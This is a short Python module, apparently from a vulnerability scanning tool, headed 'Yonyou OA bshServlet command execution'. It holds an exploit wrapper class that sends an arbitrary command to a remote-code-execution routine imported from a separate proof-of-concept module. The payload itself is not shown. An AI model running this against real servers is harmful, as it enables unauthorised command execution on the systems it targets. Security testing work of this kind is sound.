# 用友OA_bshServlet命令执行
import re

from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .. import requestUtil
from . import nc_bsh_rce_poc
from .nc_bsh_rce_poc import POC
from ..requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def exp(self, cmd, content="", service=None):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        return poc.bsh_rce(self.vuln.url, cmd, "exp")
